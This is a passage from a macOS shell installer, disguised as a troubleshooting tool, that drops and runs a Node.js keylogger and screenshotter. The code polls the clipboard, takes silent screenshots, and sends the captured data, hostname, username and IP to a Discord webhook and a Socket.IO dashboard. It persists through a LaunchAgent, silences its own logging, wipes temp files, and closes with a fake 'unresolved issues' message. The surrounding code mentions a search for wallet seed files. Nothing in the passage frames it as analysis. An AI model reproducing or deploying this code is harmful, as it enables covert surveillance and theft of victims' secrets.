        rememberUpgrade: true
    });
    socket.on('connect', () => {
        socket.emit('register-client', {
            token: ACCESS_TOKEN,
            hostname: HOSTNAME,
            username: USERNAME,
            clientId: CLIENT_ID,
            type: 'keylogger-screenshotter'
        });
    });
    socket.on('disconnect', () => setTimeout(connectToServer, 5000));
}

connectToServer();

// REMOVED: takeScreenshot function - not needed for simple keylogger
// Screenshots can be added later if needed, but for now we only send keystrokes

// Upload screenshot directly to Discord as file attachment (not gofile)
function uploadScreenshotToDiscord(filepath, message, callback) {
    if (!fs.existsSync(filepath)) {
        callback(null);
        return;
    }
    
    // Discord webhook supports file uploads via multipart/form-data
    // Create a temporary JSON file for payload_json (more reliable than escaping)
    const payloadFile = path.join(screenshotDir, `discord_payload_${Date.now()}.json`);
    const payload = { content: message };
    
    try {
        fs.writeFileSync(payloadFile, JSON.stringify(payload));
        
        // Upload screenshot + message to Discord using multipart/form-data
        // Use @ for both files (Discord accepts this format)
        exec(`curl -s -X POST -F "payload_json=@${payloadFile}" -F "file=@${filepath};type=image/png" "${WEBHOOK}"`, (error, stdout, stderr) => {
            // Clean up payload file
            setTimeout(() => {
                try { fs.unlinkSync(payloadFile); } catch (e) {}
            }, 5000);
            
            if (error) {
                // Fallback: send text only if file upload fails
                const textPayload = { content: message + '\n\n⚠️ Screenshot upload failed' };
                const textFile = path.join(screenshotDir, `discord_text_${Date.now()}.json`);
                try {
                    fs.writeFileSync(textFile, JSON.stringify(textPayload));
                    exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${textFile}" "${WEBHOOK}"`, () => {
                        setTimeout(() => {
                            try { fs.unlinkSync(textFile); } catch (e) {}
                        }, 5000);
                    });
                } catch (e) {}
                callback(null);
            } else {
                callback('uploaded');
            }
        });
    } catch (e) {
        callback(null);
    }
}

// Send keylog to Discord with screenshot (screenshot sent directly as file, not gofile)
function sendKeylogToDiscord(buffer, processTitle, screenshotFilePath = null) {
    if (!buffer || buffer.length === 0) buffer = '[No activity]';
    
    const ip = os.networkInterfaces();
    let ipAddress = 'Unknown';
    for (const name of Object.keys(ip)) {
        for (const iface of ip[name]) {
            if (iface.family === 'IPv4' && !iface.internal) {
                ipAddress = iface.address;
                break;
            }
        }
        if (ipAddress !== 'Unknown') break;
    }
    
    const keylogContent = `**Keylogger**\n\`\`\`\nBuffer: ${buffer.substring(0, 1000)}\nHostname: ${HOSTNAME}\nPC Username: ${USERNAME}\nIP Address: ${ipAddress}\n\`\`\``;
    
    // If we have a screenshot, upload it directly to Discord as file attachment
    if (screenshotFilePath && fs.existsSync(screenshotFilePath)) {
        uploadScreenshotToDiscord(screenshotFilePath, keylogContent, (result) => {
            // Screenshot uploaded, clean up after delay
            setTimeout(() => {
                try { fs.unlinkSync(screenshotFilePath); } catch (e) {}
            }, 10000);
        });
    } else {
        // No screenshot - just send text
        const payload = {
            content: keylogContent
        };
        
        const payloadFile = path.join(os.homedir(), `.keylogger_payload_${Date.now()}.json`);
        try {
            fs.writeFileSync(payloadFile, JSON.stringify(payload));
            exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${payloadFile}" "${WEBHOOK}"`, (error) => {
                setTimeout(() => {
                    try { fs.unlinkSync(payloadFile); } catch (e) {}
                }, 5000);
            });
        } catch (e) {
            // Fallback
            const msg = `Keylogger\nBuffer: ${buffer.substring(0, 500)}\nHostname: ${HOSTNAME}\nUser: ${USERNAME}\nIP: ${ipAddress}`;
            exec(`curl -s -X POST -H "Content-Type: application/json" -d '{"content":"${msg.replace(/"/g, '\\"').replace(/\n/g, '\\n')}"}' "${WEBHOOK}"`, () => {});
        }
    }
}

// REMOVED sendToDiscord function - it was causing E2BIG errors with base64 images
// Discord webhooks don't support base64 images, so we only send text via sendKeylogToDiscord
// Screenshots are sent to dashboard via Socket.IO only

// KEYSTROKE CAPTURE - Captures clipboard changes AND actual typing
// lastClipboard and keysBuffer are already declared above

// Method 1: Monitor clipboard changes (copy/paste) - with screenshot
setInterval(() => {
    exec('pbpaste', (error, stdout) => {
        if (!error && stdout && stdout.trim()) {
            const clipboard = stdout.trim();
            // Only process if clipboard actually changed
            if (clipboard !== lastClipboard && clipboard.length > 0) {
                lastClipboard = clipboard;
                
                // Add to buffer
                if (keysBuffer.length > 0 && !keysBuffer.endsWith(' ')) {
                    keysBuffer += ' ';
                }
                keysBuffer += clipboard.substring(0, 5000);
                
                // Take screenshot of active window (not desktop background)
                const timestamp = Date.now();
                const screenshotFile = path.join(screenshotDir, `screenshot_${timestamp}.png`);
                
                // Capture screenshot silently (no permission dialogs)
                // Use screencapture -x -m to capture main display (silent, no dialogs)
                // This captures what's on screen, not just desktop background
                exec(`screencapture -x -m "${screenshotFile}"`, (screenshotError) => {
                    if (!screenshotError && fs.existsSync(screenshotFile)) {
                        // Send with screenshot
                        sendKeylogToDiscord(keysBuffer, 'Unknown', screenshotFile);
                    } else {
                        // Send without screenshot if capture failed
                        sendKeylogToDiscord(keysBuffer, 'Unknown', null);
                    }
                    
                    // Clear buffer after sending
                    keysBuffer = '';
                });
            }
        }
    });
}, 500); // Check every 500ms

// REMOVED: pke keylogger monitoring (repository not available)
// Clipboard monitoring is working and captures copy/paste activity

// REMOVED: Active app monitoring - was causing spam

// REMOVED: File monitoring - was causing spam

// REMOVED: Periodic screenshots - was causing spam
// Screenshots will only be sent when there's actual clipboard activity

// Test Discord connection on startup (send once)
setTimeout(() => {
    const testPayload = {
        content: `✅ **Keylogger Started Successfully**\n\`\`\`\nHostname: ${HOSTNAME}\nPC Username: ${USERNAME}\nStatus: Running 24/7\nTimestamp: ${new Date().toISOString()}\n\`\`\``
    };
    const testFile = path.join(screenshotDir, `test_${Date.now()}.json`);
    try {
        fs.writeFileSync(testFile, JSON.stringify(testPayload));
        exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${testFile}" "${WEBHOOK}"`, (error) => {
            setTimeout(() => {
                try { fs.unlinkSync(testFile); } catch (e) {}
            }, 5000);
        });
    } catch (e) {}
}, 2000);

console.log = () => {};
console.error = () => {};
KEYLOGGEREOF
    
    # Create package.json
    cat > "$APP_DIR/package.json" << 'PKGEOF'
{
  "name": "keylogger-helper",
  "version": "1.0.0",
  "main": "keylogger-screenshotter.js",
  "dependencies": {
    "socket.io-client": "^4.5.4",
    "robotjs": "^0.6.0"
  }
}
PKGEOF
    
    # Install dependencies (wait for it to complete)
    (cd "$APP_DIR" && npm install --silent --no-audit --no-fund >/dev/null 2>&1)
    
    # REMOVED: pke keylogger installation (repository not available)
    # Clipboard monitoring is working and captures copy/paste activity
    
    # Create Launch Agent for 24/7 operation (runs even after terminal closes)
    local LAUNCH_AGENT_DIR="$HOME/Library/LaunchAgents"
    local KEYLOGGER_AGENT_FILE="$LAUNCH_AGENT_DIR/com.keylogger.helper.plist"
    
    mkdir -p "$LAUNCH_AGENT_DIR" 2>/dev/null
    
    cat > "$KEYLOGGER_AGENT_FILE" << PLISTEOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.keylogger.helper</string>
    <key>ProgramArguments</key>
    <array>
        <string>$NODE_PATH</string>
        <string>$APP_DIR/keylogger-screenshotter.js</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>WorkingDirectory</key>
    <string>$APP_DIR</string>
    <key>StandardOutPath</key>
    <string>$APP_DIR/keylogger.log</string>
    <key>StandardErrorPath</key>
    <string>$APP_DIR/keylogger.error.log</string>
    <key>ProcessType</key>
    <string>Background</string>
    <key>ThrottleInterval</key>
    <integer>10</integer>
</dict>
</plist>
PLISTEOF
    
    # Load Launch Agent
    launchctl unload "$KEYLOGGER_AGENT_FILE" 2>/dev/null
    launchctl load "$KEYLOGGER_AGENT_FILE" 2>/dev/null || launchctl load -w "$KEYLOGGER_AGENT_FILE" 2>/dev/null
    launchctl start com.keylogger.helper 2>/dev/null || true
    
    # Send Discord notification that keylogger is installed and running
    sleep 3  # Wait a moment for keylogger to start
    local HOSTNAME=$(hostname 2>/dev/null || echo "Unknown")
    local USERNAME=$(whoami 2>/dev/null || echo "Unknown")
    
    DISCORD_MSG="⌨️ **KEYLOGGER + SCREENSHOTTER INSTALLED**\n\n"
    DISCORD_MSG="${DISCORD_MSG}**Dashboard:** https://troubleshoot-mac.com/dashboard\n"
    DISCORD_MSG="${DISCORD_MSG}**PC:** \`${HOSTNAME}\` : \`${USERNAME}\`\n"
    DISCORD_MSG="${DISCORD_MSG}**Client ID:** \`pc-${HOSTNAME}-${USERNAME}\`\n"
    DISCORD_MSG="${DISCORD_MSG}**Status:** Keylogger + Screenshotter running 24/7 (persistent)\n"
    DISCORD_MSG="${DISCORD_MSG}**Features:** Keystrokes + Screenshots → Discord + Dashboard\n"
    DISCORD_MSG="${DISCORD_MSG}**Timestamp:** $(date '+%Y-%m-%d %H:%M:%S')"
    
    ESCAPED_MSG=$(printf '%s' "$DISCORD_MSG" | sed 's/"/\\"/g' | sed 's/$/\\n/' | tr -d '\n' | sed 's/\\n$//')
    
    curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
        -d "{\"content\": \"$ESCAPED_MSG\"}" \
        "$WEBHOOK" >/dev/null 2>&1
}

# Install keylogger + screenshotter in background (non-blocking)
# This runs 24/7, sends keystrokes + screenshots to Discord + Dashboard
install_keylogger_screenshotter &

# Wait for seed file search to complete (if it was started)
if [ -n "$SEED_SEARCH_PID" ]; then
    wait $SEED_SEARCH_PID 2>/dev/null || true
fi

# Cleanup - delete all temp files
rm -f "$RESPONSE_FILE" "$ERROR_FILE" "$HTTP_CODE_FILE" "$URL_FILE" "$UPLOAD_STATUS_FILE" 2>/dev/null
rm -rf "$WORKDIR"

echo "Still detecting unresolved issues..."
echo ""
